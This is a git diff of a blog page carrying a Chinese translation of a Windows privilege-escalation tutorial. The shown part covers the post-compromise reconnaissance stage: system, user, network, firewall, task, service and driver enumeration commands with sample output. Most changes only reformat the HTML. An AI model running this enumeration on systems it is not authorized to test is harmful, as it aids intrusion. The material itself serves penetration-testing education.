@@ -20,17 +20,27 @@
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
     <title>Windows权限提升基础 ~ Misaki&#39;s Blog</title>
-    <link rel="stylesheet" href="/css/Material_Icons.css">
-    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/css/main.css">
     
-        <link rel="stylesheet" href="/css/post.css">
+<link rel="stylesheet" href="/css/main.css">
+
+    
         
-            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
         
     
-</head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class=" sidebar-collapse">
 <nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
@@ -112,26 +122,28 @@
       <div class="container">
         <div class="section">
           <div class="post_content">
-              <p>原文链接：<a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a></p>
+              <p>原文链接：<a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></p>
 <h1 id="Windows权限提升基础"><a href="#Windows权限提升基础" class="headerlink" title="Windows权限提升基础"></a>Windows权限提升基础</h1><p>没有多少人谈论严重的Windows权限升级，这是一种耻辱。我认为造成这种情况的原因可能是（1）在测试时，低版权的外壳通常都是客户需要的证据，（2）在分阶段的环境中，你经常会弹出管理员账号，（3）米预测让你懒惰（getsystem = lazy-fu），（4）构建评论经常最终成为 - &gt;认证nessus scan，microsoft security baseline analyzer …</p>
 <p>与常见的看法相反，如果配置小心，Windows机箱可以很好地锁定。最重要的是，补丁时间窗口机会很小。因此，让我们深入了解Windows操作系统的黑暗角落，看看我们是否可以获得SYSTEM。</p>
 <p>应该注意的是，我将使用各种版本的Windows来突出显示可能存在的任何命令行差异。请记住这一点，因为在不存在的命令或产生稍微不同的输出方面可能存在各种OS / SP差异。我已经尝试构建本教程，因此它将以最常用的方式应用于Windows权限提升。</p>
 <p>最后，我想向我的朋友Kostas大声喊叫，他也非常喜欢后期开发，你真的不希望他登录你的机器。</p>
-<p>不可或缺的资源：<br>Windows Privilege Escalation百科全书（Brett Moore） -  <a href="http://www.youtube.com/watch?v=kMG8IsCohHA" target="_blank" rel="noopener">这里</a>。<br>Windows攻击：AT是新黑人（Chris Gates＆Rob Fuller） -  <a href="http://www.youtube.com/watch?v=_8xJaaQlpBo" target="_blank" rel="noopener">这里</a>。<br>通过利用弱文件夹权限提升权限（Parvez Anwar） -  <a href="http://www.greyhathacker.net/?p=738" target="_blank" rel="noopener">这里</a>。</p>
+<p>不可或缺的资源：<br>Windows Privilege Escalation百科全书（Brett Moore） -  <a target="_blank" rel="noopener" href="http://www.youtube.com/watch?v=kMG8IsCohHA">这里</a>。<br>Windows攻击：AT是新黑人（Chris Gates＆Rob Fuller） -  <a target="_blank" rel="noopener" href="http://www.youtube.com/watch?v=_8xJaaQlpBo">这里</a>。<br>通过利用弱文件夹权限提升权限（Parvez Anwar） -  <a target="_blank" rel="noopener" href="http://www.greyhathacker.net/?p=738">这里</a>。</p>
 <h2 id="Δt-for-t0-to-t3-初始信息收集"><a href="#Δt-for-t0-to-t3-初始信息收集" class="headerlink" title="Δt for t0 to t3 - 初始信息收集"></a>Δt for t0 to t3 - 初始信息收集</h2><p>  本教程的起点是一个盒子上没有特权的shell。我们可能使用了远程攻击或客户端攻击，我们得到了一个shell。基本上在时间t0，我们不了解机器，它做什么，它连接到什么，我们有什么级别的特权，甚至是什么操作系统。</p>
 <p>最初，我们希望快速收集一些基本信息，以便我们可以获得一块土地并评估我们的情况。</p>
 <p>首先让我们找出我们连接的操作系统：  </p>
-<pre><code>C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\system32&gt; systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;
 OS Name:                   Microsoft Windows 7 Professional
-OS Version:                6.1.7601 Service Pack 1 Build 7601
-</code></pre><p>接下来，我们将看到框的主机名是什么以及我们连接的用户是什么。</p>
-<pre><code>C:\Windows\system32&gt; hostname
+OS Version:                6.1.7601 Service Pack 1 Build 7601<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>接下来，我们将看到框的主机名是什么以及我们连接的用户是什么。</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\system32&gt; hostname
 b33f
 
 C:\Windows\system32&gt; echo %username%
-user1
-</code></pre><p>现在我们有了这个基本信息，我们在框中列出了其他用户帐户，并更详细地查看了我们自己的用户信息。我们已经可以看到user1不是本地组管理员的一部分。</p>
-<pre><code>C:\Windows\system32&gt; net users
+user1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>现在我们有了这个基本信息，我们在框中列出了其他用户帐户，并更详细地查看了我们自己的用户信息。我们已经可以看到user1不是本地组管理员的一部分。</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\system32&gt; net users
 
 User accounts for \\B33F
 
@@ -150,9 +162,9 @@ Country code                 000 (System Default)
 Account active               Yes
 Account expires              Never
 
-Password last set            1/11/2014 7:47:14 PM
+Password last set            1&#x2F;11&#x2F;2014 7:47:14 PM
 Password expires             Never
-Password changeable          1/11/2014 7:47:14 PM
+Password changeable          1&#x2F;11&#x2F;2014 7:47:14 PM
 Password required            Yes
 User may change password     Yes
 
@@ -160,16 +172,17 @@ Workstations allowed         All
 Logon script
 User profile
 Home directory
-Last logon                   1/11/2014 8:05:09 PM
+Last logon                   1&#x2F;11&#x2F;2014 8:05:09 PM
 
 Logon hours allowed          All
 
 Local Group Memberships      *Users
 Global Group memberships     *None
-The command completed successfully.
-</code></pre><p> 这就是我们目前需要了解的用户和权限。我们列表中的下一步是网络，连接到的机器是什么以及它对这些连接施加了什么规则。</p>
+The command completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p> 这就是我们目前需要了解的用户和权限。我们列表中的下一步是网络，连接到的机器是什么以及它对这些连接施加了什么规则。</p>
 <p>首先让我们看一下可用的网络接口和路由表。  </p>
-<pre><code>C:\Windows\system32&gt; ipconfig /all
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\system32&gt; ipconfig &#x2F;all
 
 Windows IP Configuration
 
@@ -187,11 +200,11 @@ Ethernet adapter Bluetooth Network Connection:
    Physical Address. . . . . . . . . : 0C-84-DC-62-60-29
    DHCP Enabled. . . . . . . . . . . : Yes
    Autoconfiguration Enabled . . . . : Yes
-
+   
 Ethernet adapter Local Area Connection:
 
    Connection-specific DNS Suffix  . :
-   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+   Description . . . . . . . . . . . : Intel(R) PRO&#x2F;1000 MT Network Connection
    Physical Address. . . . . . . . . : 00-0C-29-56-79-35
    DHCP Enabled. . . . . . . . . . . : Yes
    Autoconfiguration Enabled . . . . : Yes
@@ -209,20 +222,20 @@ Ethernet adapter Local Area Connection:
 
 C:\Windows\system32&gt; route print
 
-===========================================================================
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 Interface List
  18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network)
  13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9
- 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection
+ 11...00 0c 29 56 79 35 ......Intel(R) PRO&#x2F;1000 MT Network Connection
   1...........................Software Loopback Interface 1
  16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
  15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2
  19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3
  14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
-===========================================================================
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 
 IPv4 Route Table
-===========================================================================
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 Active Routes:
 Network Destination        Netmask          Gateway       Interface  Metric
           0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     10
@@ -236,32 +249,32 @@ Network Destination        Netmask          Gateway       Interface  Metric
         224.0.0.0        240.0.0.0         On-link     192.168.0.104    266
   255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
   255.255.255.255  255.255.255.255         On-link     192.168.0.104    266
-===========================================================================
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 Persistent Routes:
   None
 
 IPv6 Route Table
-===========================================================================
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 Active Routes:
  If Metric Network Destination      Gateway
- 14     58 ::/0                     On-link
-  1    306 ::1/128                  On-link
- 14     58 2001::/32                On-link
- 14    306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128
+ 14     58 ::&#x2F;0                     On-link
+  1    306 ::1&#x2F;128                  On-link
+ 14     58 2001::&#x2F;32                On-link
+ 14    306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97&#x2F;128
                                     On-link
- 11    266 fe80::/64                On-link
- 14    306 fe80::/64                On-link
- 14    306 fe80::8d2:b4e:3f57:ff97/128
+ 11    266 fe80::&#x2F;64                On-link
+ 14    306 fe80::&#x2F;64                On-link
+ 14    306 fe80::8d2:b4e:3f57:ff97&#x2F;128
                                     On-link
- 11    266 fe80::5cd4:9caf:61c0:ba6e/128
+ 11    266 fe80::5cd4:9caf:61c0:ba6e&#x2F;128
                                     On-link
-  1    306 ff00::/8                 On-link
- 14    306 ff00::/8                 On-link
- 11    266 ff00::/8                 On-link
-===========================================================================
+  1    306 ff00::&#x2F;8                 On-link
+ 14    306 ff00::&#x2F;8                 On-link
+ 11    266 ff00::&#x2F;8                 On-link
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 Persistent Routes:
   None
-
+  
 # arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.
 
 C:\Windows\system32&gt; arp -A
@@ -275,9 +288,12 @@ Interface: 192.168.0.104 --- 0xb
   224.0.0.251           01-00-5e-00-00-fb     static
   224.0.0.252           01-00-5e-00-00-fc     static
   239.255.255.250       01-00-5e-7f-ff-fa     static
-  255.255.255.255       ff-ff-ff-ff-ff-ff     static
-</code></pre><p>这将我们带到活动网络连接和防火墙规则。</p>
-<pre><code>C:\Windows\system32&gt; netstat -ano
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>这将我们带到活动网络连接和防火墙规则。</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\system32&gt; netstat -ano
 
 Active Connections
 
@@ -311,21 +327,21 @@ Active Connections
   UDP    [::1]:65433            *:*                                    2956
   UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:1900  *:*                      2956
   UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:65432  *:*                     2956
-
-# The following two netsh commands are examples of commands that are not universal across OS/SP. The netsh
+  
+# The following two netsh commands are examples of commands that are not universal across OS&#x2F;SP. The netsh
 firewall commands are only available from XP SP2 and upwards.
 
 C:\Windows\system32&gt; netsh firewall show state
 
 Firewall status:
 -------------------------------------------------------------------
-Profile                           = Standard
-Operational mode                  = Enable
-Exception mode                    = Enable
-Multicast/broadcast response mode = Enable
-Notification mode                 = Enable
-Group policy version              = Windows Firewall
-Remote admin mode                 = Disable
+Profile                           &#x3D; Standard
+Operational mode                  &#x3D; Enable
+Exception mode                    &#x3D; Enable
+Multicast&#x2F;broadcast response mode &#x3D; Enable
+Notification mode                 &#x3D; Enable
+Group policy version              &#x3D; Windows Firewall
+Remote admin mode                 &#x3D; Disable
 
 Ports currently open on all network interfaces:
 Port   Protocol  Version  Program
@@ -336,13 +352,13 @@ C:\Windows\system32&gt; netsh firewall show config
 
 Domain profile configuration:
 -------------------------------------------------------------------
-Operational mode                  = Enable
-Exception mode                    = Enable
-Multicast/broadcast response mode = Enable
-Notification mode                 = Enable
+Operational mode                  &#x3D; Enable
+Exception mode                    &#x3D; Enable
+Multicast&#x2F;broadcast response mode &#x3D; Enable
+Notification mode                 &#x3D; Enable
 
 Allowed programs configuration for Domain profile:
-Mode     Traffic direction    Name / Program
+Mode     Traffic direction    Name &#x2F; Program
 -------------------------------------------------------------------
 
 Port configuration for Domain profile:
@@ -356,10 +372,10 @@ Enable   2     Allow outbound packet too big
 
 Standard profile configuration (current):
 -------------------------------------------------------------------
-Operational mode                  = Enable
-Exception mode                    = Enable
-Multicast/broadcast response mode = Enable
-Notification mode                 = Enable
+Operational mode                  &#x3D; Enable
+Exception mode                    &#x3D; Enable
+Multicast&#x2F;broadcast response mode &#x3D; Enable
+Notification mode                 &#x3D; Enable
 
 Service configuration for Standard profile:
 Mode     Customized  Name
@@ -367,10 +383,10 @@ Mode     Customized  Name
 Enable   No          Network Discovery
 
 Allowed programs configuration for Standard profile:
-Mode     Traffic direction    Name / Program
+Mode     Traffic direction    Name &#x2F; Program
 -------------------------------------------------------------------
-Enable   Inbound              COMRaider / E:\comraider\comraider.exe
-Enable   Inbound              nc.exe / C:\users\b33f\desktop\nc.exe
+Enable   Inbound              COMRaider &#x2F; E:\comraider\comraider.exe
+Enable   Inbound              nc.exe &#x2F; C:\users\b33f\desktop\nc.exe
 
 Port configuration for Standard profile:
 Port   Protocol  Mode    Traffic direction     Name
@@ -383,28 +399,31 @@ Enable   2     Allow outbound packet too big
 
 Log configuration:
 -------------------------------------------------------------------
-File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
-Max file size   = 4096 KB
-Dropped packets = Disable
-Connections     = Disable
-</code></pre><p>最后，我们将简要介绍受感染的盒子上运行的内容：计划任务，运行进程，已启动服务和已安装的驱动程序。</p>
-<pre><code># This will display verbose output for all scheduled tasks, below you can see sample output for a
+File location   &#x3D; C:\Windows\system32\LogFiles\Firewall\pfirewall.log
+Max file size   &#x3D; 4096 KB
+Dropped packets &#x3D; Disable
+Connections     &#x3D; Disable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>最后，我们将简要介绍受感染的盒子上运行的内容：计划任务，运行进程，已启动服务和已安装的驱动程序。</p>
+<pre class="line-numbers language-none"><code class="language-none"># This will display verbose output for all scheduled tasks, below you can see sample output for a
 single task.
 
-C:\Windows\system32&gt; schtasks /query /fo LIST /v
+C:\Windows\system32&gt; schtasks &#x2F;query &#x2F;fo LIST &#x2F;v
 
 Folder: \Microsoft\Windows Defender
 HostName:                             B33F
 TaskName:                             \Microsoft\Windows Defender\MP Scheduled Scan
-Next Run Time:                        1/22/2014 5:11:13 AM
+Next Run Time:                        1&#x2F;22&#x2F;2014 5:11:13 AM
 Status:                               Ready
-Logon Mode:                           Interactive/Background
-Last Run Time:                        N/A
+Logon Mode:                           Interactive&#x2F;Background
+Last Run Time:                        N&#x2F;A
 Last Result:                          1
-Author:                               N/A
+Author:                               N&#x2F;A
 Task To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob
                                       -WinTask -RestrictPrivilegesScan
-Start In:                             N/A
+Start In:                             N&#x2F;A
 Comment:                              Scheduled Scan
 Scheduled Task State:                 Enabled
 Idle Time:                            Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes
@@ -415,10 +434,10 @@ Stop Task If Runs X Hours and X Mins: 72:00:00
 Schedule:                             Scheduling data is not available in this format.
 Schedule Type:                        Daily
 Start Time:                           5:11:13 AM
-Start Date:                           1/1/2000
-End Date:                             1/1/2100
+Start Date:                           1&#x2F;1&#x2F;2000
+End Date:                             1&#x2F;1&#x2F;2100
 Days:                                 Every 1 day(s)
-Months:                               N/A
+Months:                               N&#x2F;A
 Repeat: Every:                        Disabled
 Repeat: Until: Time:                  Disabled
 Repeat: Until: Duration:              Disabled
@@ -427,20 +446,20 @@ Repeat: Stop If Still Running:        Disabled
 
 # The following command links running processes to started services.
 
-C:\Windows\system32&gt; tasklist /SVC
+C:\Windows\system32&gt; tasklist &#x2F;SVC
 
 Image Name                     PID Services
-========================= ======== ============================================
-System Idle Process              0 N/A
-System                           4 N/A
-smss.exe                       244 N/A
-csrss.exe                      332 N/A
-csrss.exe                      372 N/A
-wininit.exe                    380 N/A
-winlogon.exe                   428 N/A
-services.exe                   476 N/A
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+System Idle Process              0 N&#x2F;A
+System                           4 N&#x2F;A
+smss.exe                       244 N&#x2F;A
+csrss.exe                      332 N&#x2F;A
+csrss.exe                      372 N&#x2F;A
+wininit.exe                    380 N&#x2F;A
+winlogon.exe                   428 N&#x2F;A
+services.exe                   476 N&#x2F;A
 lsass.exe                      484 SamSs
-lsm.exe                        496 N/A
+lsm.exe                        496 N&#x2F;A
 svchost.exe                    588 DcomLaunch, PlugPlay, Power
 svchost.exe                    668 RpcEptMapper, RpcSs
 svchost.exe                    760 Audiosrv, Dhcp, eventlog,
@@ -452,7 +471,7 @@ svchost.exe                    836 AeLookupSvc, BITS, gpsvc, iphlpsvc,
                                    LanmanServer, MMCSS, ProfSvc, Schedule,
                                    seclogon, SENS, ShellHWDetection, Themes,
                                    Winmgmt, wuauserv
-audiodg.exe                    916 N/A
+audiodg.exe                    916 N&#x2F;A
 svchost.exe                    992 EventSystem, fdPHost, netprofm, nsi,
                                    WdiServiceHost, WinHttpAutoProxySvc
 svchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,
@@ -460,11 +479,11 @@ svchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,
 spoolsv.exe                   1244 Spooler
 svchost.exe                   1272 BFE, DPS, MpsSvc
 mDNSResponder.exe             1400 Bonjour Service
-taskhost.exe                  1504 N/A
-taskeng.exe                   1556 N/A
+taskhost.exe                  1504 N&#x2F;A
+taskeng.exe                   1556 N&#x2F;A
 vmtoolsd.exe                  1580 VMTools
-dwm.exe                       1660 N/A
-explorer.exe                  1668 N/A
+dwm.exe                       1660 N&#x2F;A
+explorer.exe                  1668 N&#x2F;A
 vmware-usbarbitrator.exe      1768 VMUSBArbService
 TPAutoConnSvc.exe             1712 TPAutoConnSvc
 [..Snip..]
@@ -495,70 +514,73 @@ These Windows services are started:
    Function Discovery Resource Publication
    Group Policy Client
 [..Snip..]
-
+   
 # This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes
 than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.
 
 C:\Windows\system32&gt; DRIVERQUERY
 
 Module Name  Display Name           Driver Type   Link Date
-============ ====================== ============= ======================
-1394ohci     1394 OHCI Compliant Ho Kernel        11/20/2010 6:01:11 PM
-ACPI         Microsoft ACPI Driver  Kernel        11/20/2010 4:37:52 PM
-AcpiPmi      ACPI Power Meter Drive Kernel        11/20/2010 4:47:55 PM
-adp94xx      adp94xx                Kernel        12/6/2008 7:59:55 AM
-adpahci      adpahci                Kernel        5/2/2007 1:29:26 AM
-adpu320      adpu320                Kernel        2/28/2007 8:03:08 AM
-AFD          Ancillary Function Dri Kernel        11/20/2010 4:40:00 PM
-agp440       Intel AGP Bus Filter   Kernel        7/14/2009 7:25:36 AM
-aic78xx      aic78xx                Kernel        4/12/2006 8:20:11 AM
-aliide       aliide                 Kernel        7/14/2009 7:11:17 AM
-amdagp       AMD AGP Bus Filter Dri Kernel        7/14/2009 7:25:36 AM
-amdide       amdide                 Kernel        7/14/2009 7:11:19 AM
-AmdK8        AMD K8 Processor Drive Kernel        7/14/2009 7:11:03 AM
-AmdPPM       AMD Processor Driver   Kernel        7/14/2009 7:11:03 AM
-amdsata      amdsata                Kernel        3/19/2010 9:08:27 AM
-amdsbs       amdsbs                 Kernel        3/21/2009 2:35:26 AM
-amdxata      amdxata                Kernel        3/20/2010 12:19:01 AM
-AppID        AppID Driver           Kernel        11/20/2010 5:29:48 PM
-arc          arc                    Kernel        5/25/2007 5:31:06 AM
-[..Snip..]
-</code></pre><h2 id="Δt-for-t4-WMIC的奥术艺术"><a href="#Δt-for-t4-WMIC的奥术艺术" class="headerlink" title="Δt for t4 - WMIC的奥术艺术"></a>Δt for t4 - WMIC的奥术艺术</h2><p>  我想分别提到WMIC（Windows Management Instrumentation命令行），因为它是Windows最有用的命令行工具。WIMIC对于信息收集和后期开发非常实用。据说它有点笨重，输出还有很多不足之处。</p>
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+1394ohci     1394 OHCI Compliant Ho Kernel        11&#x2F;20&#x2F;2010 6:01:11 PM
+ACPI         Microsoft ACPI Driver  Kernel        11&#x2F;20&#x2F;2010 4:37:52 PM
